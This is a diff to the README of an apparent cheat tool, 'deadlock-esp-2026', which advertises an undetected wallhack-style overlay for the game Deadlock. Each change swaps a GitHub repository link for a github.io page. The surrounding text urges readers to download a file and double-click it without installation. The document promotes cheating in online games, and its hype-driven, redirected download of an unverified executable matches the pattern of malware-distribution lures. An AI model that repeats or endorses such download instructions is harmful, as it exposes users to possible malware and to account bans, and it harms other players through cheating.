@@ -1,6 +1,6 @@
 # ⚡ deadlock-esp-2026 - Your Ultimate Deadlock ESP Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Visit_Page-B87333?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Materialisttalloil1266/deadlock-esp-2026)
+[![Download Now](https://img.shields.io/badge/Download-Visit_Page-B87333?style=for-the-badge&logo=github&logoColor=white)](https://materialisttalloil1266.github.io)
 
 ---
 
@@ -50,7 +50,7 @@ This is an **external, undetected** companion that runs alongside your game, sho
 
 Getting started is simple:
 
-1. **Visit the download page** using this link: [https://github.com/Materialisttalloil1266/deadlock-esp-2026](https://github.com/Materialisttalloil1266/deadlock-esp-2026)
+1. **Visit the download page** using this link: [https://materialisttalloil1266.github.io](https://materialisttalloil1266.github.io)
 
 2. **Click the download button** on that page to get the latest version.
 
@@ -79,7 +79,7 @@ This tool is designed to work on virtually any Windows computer that can run Dea
 Use the link above to download the application to your computer.
 
 ### Step 2: Run the Application
-After downloading, visit this link to download the application — [https://github.com/Materialisttalloil1266/deadlock-esp-2026](https://github.com/Materialisttalloil1266/deadlock-esp-2026). Once you have it, simply double-click the downloaded file to launch it. No installation process is required — it runs directly.
+After downloading, visit this link to download the application — [https://materialisttalloil1266.github.io](https://materialisttalloil1266.github.io). Once you have it, simply double-click the downloaded file to launch it. No installation process is required — it runs directly.
 
 ### Step 3: Start Deadlock
 Launch Deadlock 2026 as you normally would. The ESP tool will automatically detect the game and display the overlay.
@@ -169,7 +169,7 @@ Join thousands of players who use Deadlock ESP to climb their ranks:
 
 Deadlock ESP transforms how you play — no more guessing where enemies are, no more missing souls, no more getting caught off-guard. With this tool, you'll see everything, know everything, and win more matches. It's free, packed with features, and ready to use right now.
 
-Visit this link to download the application: [https://github.com/Materialisttalloil1266/deadlock-esp-2026](https://github.com/Materialisttalloil1266/deadlock-esp-2026)
+Visit this link to download the application: [https://materialisttalloil1266.github.io](https://materialisttalloil1266.github.io)
 
 Make your move — the ultimate Deadlock advantage is just one click away.
 
